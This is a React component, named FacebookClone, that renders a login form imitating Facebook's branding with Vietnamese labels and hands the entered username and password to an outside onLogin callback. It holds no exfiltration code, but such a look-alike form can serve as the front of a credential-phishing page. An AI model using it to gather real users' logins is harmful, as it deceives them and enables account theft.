import React, { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Eye, EyeOff, Loader } from 'lucide-react';

const FacebookClone = ({ onLogin, isLoading }) => {
  const [showPassword, setShowPassword] = useState(false);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = (e) => {
    e.preventDefault();
    if (username && password) {
      onLogin({ username, password });
    }
  };

  return (
    <div className="w-full flex flex-col justify-center p-4 sm:p-6 text-center">
      <h1 className="text-4xl sm:text-5xl font-bold text-blue-600 mb-6">facebook</h1>
      <form onSubmit={handleSubmit} className="space-y-4 max-w-sm mx-auto w-full">
        <div>
          <Input
            type="text"
            placeholder="Email hoặc số điện thoại"
            required
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            className="w-full p-3 text-sm sm:text-base border border-gray-300 rounded-md focus:ring-blue-500 focus:border-blue-500 text-black placeholder-gray-500 bg-gray-50/80"
            aria-label="Email hoặc số điện thoại"
          />
        </div>
        <div className="relative">
          <Input
            type={showPassword ? 'text' : 'password'}
            placeholder="Mật khẩu"
            required
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="w-full p-3 text-sm sm:text-base border border-gray-300 rounded-md focus:ring-blue-500 focus:border-blue-500 text-black placeholder-gray-500 bg-gray-50/80 pr-10"
            aria-label="Mật khẩu"
          />
           <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-500 hover:text-gray-700"
              aria-label={showPassword ? "Ẩn mật khẩu" : "Hiện mật khẩu"}
            >
              {showPassword ? <EyeOff /> : <Eye />}
            </button>
        </div>
        <Button
          type="submit"
          className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 text-base sm:text-lg rounded-md"
          disabled={isLoading}
        >
          {isLoading ? <Loader className="animate-spin" /> : 'Đăng nhập'}
        </Button>
      </form>
      <div className="text-center mt-4">
        <a href="#" className="text-xs sm:text-sm text-blue-600 hover:underline">
          Quên mật khẩu?
        </a>
      </div>
    </div>
  );
};

export default FacebookClone;